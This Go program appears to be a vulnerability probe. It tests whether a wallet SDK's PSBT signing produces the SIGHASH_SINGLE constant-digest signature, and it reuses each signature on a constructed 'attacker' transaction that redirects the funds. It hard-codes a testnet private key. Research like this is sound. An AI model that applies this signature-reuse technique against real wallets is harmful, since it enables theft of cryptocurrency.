package main

import (
	"bytes"
	"encoding/hex"
	"fmt"

	"github.com/btcsuite/btcd/btcec/v2/ecdsa"
	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/btcutil/psbt"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcd/chaincfg/chainhash"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/okx/go-wallet-sdk/coins/bitcoin"
)

const wif = "cPnvkvUYyHcSSS26iD1dkrJdV7k1RoUqJLhn3CYxpo398PdLVE22"

func p2pkh(pub []byte) []byte {
	h := btcutil.Hash160(pub)
	s, _ := bitcoin.PayToPubKeyHashScript(h)
	return s
}

func main() {
	w, _ := btcutil.DecodeWIF(wif)
	pub := w.PrivKey.PubKey()
	spk := p2pkh(pub.SerializeCompressed())

	fund := wire.NewMsgTx(2)
	fund.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x42}, Index: 0}, nil, nil))
	fund.AddTxOut(wire.NewTxOut(100000, spk))

	tx := wire.NewMsgTx(2)
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0xaa}, Index: 0}, nil, nil))
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: fund.TxHash(), Index: 0}, nil, nil))
	tx.AddTxOut(wire.NewTxOut(90000, spk))

	pkt, err := psbt.NewFromUnsignedTx(tx)
	if err != nil { fmt.Println("CELL init err", err); return }
	pkt.Inputs[0].NonWitnessUtxo = fund
	pkt.Inputs[1].NonWitnessUtxo = fund
	var buf bytes.Buffer
	_ = pkt.Serialize(&buf)
	psbtHex := hex.EncodeToString(buf.Bytes())

	for _, sh := range []int{0x03, 0x83, 0x01} {
		opt := &bitcoin.SignPsbtOption{AutoFinalized: false, ToSignInputs: []*bitcoin.ToSignInput{{Index: 1, Address: "", SigHashTypes: []int{sh}}}}
		signedHex, serr := bitcoin.SignPsbtWithKeyPathAndScriptPath(psbtHex, wif, &chaincfg.TestNet3Params, opt)
		if serr != nil { fmt.Printf("CELL S-0x%02x sign err=%v\n", sh, serr); continue }
		raw, _ := hex.DecodeString(signedHex)
		sp, perr := psbt.NewFromRawBytes(bytes.NewReader(raw), false)
		if perr != nil { fmt.Printf("CELL S-0x%02x psbt decode err=%v\n", sh, perr); continue }
		var sigBytes []byte
		for _, ps := range sp.Inputs[1].PartialSigs {
			sigBytes = ps.Signature
		}
		if sigBytes == nil { fmt.Printf("CELL S-0x%02x no partial sig (fields: %d)\n", sh, len(sp.Inputs[1].PartialSigs)); continue }

		atk := wire.NewMsgTx(2)
		atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0xbb}, Index: 0}, nil, nil))
		atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: fund.TxHash(), Index: 0}, nil, nil))
		atkScript, _ := bitcoin.PayToPubKeyHashScript(bytes.Repeat([]byte{0x33}, 20))
		atk.AddTxOut(wire.NewTxOut(99900, atkScript))

		ht := txscript.SigHashType(sigBytes[len(sigBytes)-1])
		dig, derr := txscript.CalcSignatureHash(spk, ht, atk, 1)
		ok := false
		if derr == nil {
			if sg, e := ecdsa.ParseDERSignature(sigBytes[:len(sigBytes)-1]); e == nil {
				ok = sg.Verify(dig, pub)
			}
		}
		origDig, _ := txscript.CalcSignatureHash(spk, ht, tx, 1)
		fmt.Printf("CELL S-0x%02x signer_digest=%x (single-bug constant=%v) attacker_tx_sig_valid=%v err=%v\n", sh, origDig, isConst(origDig), ok, derr)
	}
}

func isConst(d []byte) bool {
	if len(d) != 32 { return false }
	for i := 1; i < 32; i++ { if d[i] != 0 { return false } }
	return d[0] == 0x01
}
